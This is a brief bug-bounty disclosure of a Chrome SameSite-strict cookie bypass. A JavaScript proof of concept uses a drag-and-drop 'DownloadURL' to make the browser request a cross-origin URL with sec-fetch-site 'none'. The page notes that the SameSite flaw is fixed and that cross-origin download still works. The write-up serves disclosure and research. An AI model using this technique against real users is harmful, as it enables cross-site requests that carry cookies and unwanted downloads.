---
title: SameSite strict cookies bypass/cross-origin download (Awarded $1000)
---

Dragging the `foo` text onto your desktop would download a file containing `sec-fetch-site: 'none'`.

```js
let link = document.createElement('a');
link.innerText = 'foo';
link.href = '#';
link.addEventListener('dragstart', onDragStart, false);
document.body.appendChild(link);

function onDragStart(e) {
  e.dataTransfer.setData(
    'DownloadURL',
    'application/octet-stream:demo:https://terjanq.me/xss.php?headers'
  );
  e.dataTransfer.effectAllowed = 'all';
}
```

This SameSite issue was fixed in <https://issues.chromium.org/40060358>, but cross-origin download still works <https://www.youtube.com/watch?v=mqQjzx3HSUc>
